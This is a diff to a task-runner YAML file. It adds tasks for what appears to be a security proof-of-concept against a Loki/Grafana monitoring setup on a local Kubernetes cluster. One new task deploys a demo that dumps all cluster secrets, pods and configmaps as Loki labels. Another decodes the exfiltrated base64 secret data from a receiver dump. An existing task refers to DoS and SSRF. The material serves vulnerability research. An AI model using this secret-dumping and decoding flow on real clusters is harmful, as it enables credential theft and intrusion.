@@ -111,6 +111,18 @@ tasks:
       - kubectl --kubeconfig {{.KUBECONFIG}} -n monitoring rollout restart deployment/config-server
       - kubectl --kubeconfig {{.KUBECONFIG}} -n monitoring rollout status deployment/config-server --timeout=60s
 
+  deploy:security-poc:flag5-demo:
+    desc: Inject flag5 demo — dump all k8s secrets/pods/configmaps via k8s API as loki labels
+    deps: [cluster:create]
+    vars:
+      DEMO_FILE: '{{.ROOT_DIR}}/security-poc/demos/flag5-demo.yaml'
+    preconditions:
+      - test -f {{.DEMO_FILE}}
+    cmds:
+      - sed "s/TIMESTAMP/$(date +%s)/g" {{.DEMO_FILE}} | kubectl --kubeconfig {{.KUBECONFIG}} apply -f -
+      - kubectl --kubeconfig {{.KUBECONFIG}} -n monitoring rollout restart deployment/config-server
+      - kubectl --kubeconfig {{.KUBECONFIG}} -n monitoring rollout status deployment/config-server --timeout=60s
+
   deploy:security-poc:flag4-demo:
     desc: Inject flag4 demo — DoS via remote.http + SSRF to internal endpoint as label
     deps: [cluster:create]
@@ -134,6 +146,28 @@ tasks:
       - sed "s/TIMESTAMP/$(date +%s)/g" {{.DEMO_FILE}} | kubectl --kubeconfig {{.KUBECONFIG}} apply -f -
       - kubectl --kubeconfig {{.KUBECONFIG}} -n monitoring rollout restart deployment/config-server
       - kubectl --kubeconfig {{.KUBECONFIG}} -n monitoring rollout status deployment/config-server --timeout=60s
+
+  run:security-poc:decode_k8s_dump:
+    desc: Decode k8s Secrets exfiltrated into a loki receiver dump (FILE=path/to/dump.log)
+    vars:
+      DEMOS_DIR: '{{.ROOT_DIR}}/security-poc/demos'
+    requires:
+      vars: [FILE]
+    preconditions:
+      - sh: test -f "{{.FILE}}"
+        msg: "Input dump not found: {{.FILE}}"
+    cmds:
+      # Two steps, intermediate files kept next to the input:
+      #   1. extract the `labels` field from each log line into <base>-labels.json
+      #   2. base64-decode the Opaque Secret data and print it (also saved to <base>-decoded.txt)
+      - |
+        set -euo pipefail
+        DIR="$(dirname "{{.FILE}}")"
+        BASE="$(basename "{{.FILE}}")"; BASE="${BASE%.*}"
+        LABELS="${DIR}/${BASE}-labels.json"
+        DECODED="${DIR}/${BASE}-decoded.txt"
+        python3 "{{.DEMOS_DIR}}/extract_labels.py" "{{.FILE}}" -o "$LABELS"
+        python3 "{{.DEMOS_DIR}}/decode_fields.py" "$LABELS" | tee "$DECODED"
 
   deploy:cloud-onboarding:local:
     desc: Deploy Grafana Cloud Onboarding helm chart (requires .env.credentials)
